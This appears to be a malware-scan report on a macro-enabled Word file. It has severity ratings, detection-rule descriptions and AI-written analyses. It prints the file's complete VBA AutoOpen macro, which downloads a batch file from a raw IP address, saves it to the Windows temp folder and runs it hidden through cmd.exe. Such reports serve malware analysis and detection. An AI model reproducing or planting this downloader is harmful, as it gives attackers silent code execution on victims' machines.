trid.file_type: Word Microsoft Office Open XML Format document (with Macro)
Word Microsoft Office Open XML Format document

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

sigma_analysis_results.rule_description: Detects the creation of a new office macro files on the systems

macros.vba_code:
Sub AutoOpen()
    
    Dim strURL As String
    Dim strFilePath As String
    Dim objXMLHTTP As Object
    Dim objADOStream As Object
    Dim objFSO As Object
    Dim strCommand As String
    strURL = "http://91.107.150.184/office.bat"
    

    strFilePath = "C:\windows\temp\office.bat"

    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
    Set objADOStream = CreateObject("ADODB.Stream")
    Set objFSO = CreateObject("Scripting.FileSystemObject")


    objXMLHTTP.Open "GET", strURL, False
    objXMLHTTP.send


    If objXMLHTTP.Status = 200 Then
        objADOStream.Open
        objADOStream.Type = 1
        objADOStream.Write objXMLHTTP.responseBody
        objADOStream.SaveToFile strFilePath, 2
        objADOStream.Close
    End If

    If objFSO.FileExists(strFilePath) Then

        strCommand = "cmd.exe /c " & strFilePath
        Call Shell(strCommand, vbHide)
    End If


    Set objXMLHTTP = Nothing
    Set objADOStream = Nothing
    Set objFSO = Nothing
End Sub
macros.properties: auto-open create-file create-ole download enum-windows open-file run-file write-file

crowdsourced_yara_results.description: This signature detects an office document with an embedded VBA project. While this is fairly common it is sometimes used for malicious intent.
crowdsourced_yara_results.author: InQuest Labs

crowdsourced_ai_results.analysis:
The provided macros exhibit clear signs of malicious intent. The `AutoOpen()` subroutine is particularly concerning as it automatically executes when the document is opened, which is a common tactic used by malware to ensure execution without user consent.

1. Network Activity: The macro initiates an HTTP GET request to download a file from a specified URL (`http://91.107.150.184/office.bat`). This behavior indicates an attempt to retrieve potentially harmful content from an external source.

2. File Writing: Upon successfully downloading the file (indicated by checking if the HTTP status is 200), the macro writes the downloaded content to a file located at `C:\windows\temp\office.bat`. This action involves creating or overwriting a file in a system directory, which is often associated with malicious activities.

3. Execution of Downloaded File: After confirming that the file exists, the macro constructs a command to execute the downloaded batch file using `cmd.exe /c`. The use of `vbHide` suggests that the execution will occur without displaying any command window, further indicating an intention to operate stealthily.

4. Use of COM Objects: The macro employs several COM objects (`MSXML2.XMLHTTP`, `ADODB.Stream`, and `Scripting.FileSystemObject`) to facilitate network communication, file handling, and execution. While these objects can be used for benign purposes, their combination here strongly points towards malicious usage.

5. Persistence Mechanism: Although there are no direct indications of persistence mechanisms like registry modifications or disabling security settings, the automatic execution upon opening the document itself serves as a form of persistence, ensuring that the malicious code runs every time the document is accessed.

Overall, the combination of downloading a file from an external source, writing it to a local path, and executing it without user interaction aligns with behaviors typically associated with malware. Therefore, this set of macros should be considered malicious.

The macro defines an AutoOpen subroutine, designed to execute automatically upon document opening. This subroutine initially defines several string variables: strURL, strFilePath, and strCommand. It then initializes object variables for XMLHTTP, ADOStream, and FileSystemObject.  

The macro then sets the strURL variable to "http://91.107.150.184/office.bat" and strFilePath to "C:\\windows\\temp\\office.bat". 

Using the XMLHTTP object, the macro sends a GET request to the URL specified in strURL. If the request is successful (status 200), the response is written into a newly created ADODB.Stream object. This stream is then saved to the local file system at the location defined by strFilePath, overwriting any existing file with the same name.

The macro then checks for the existence of the file specified by strFilePath. If found, it constructs and executes a command using the Windows Command Prompt (cmd.exe). This command runs the downloaded file in a hidden window.  

Finally, the macro sets the object variables to Nothing.
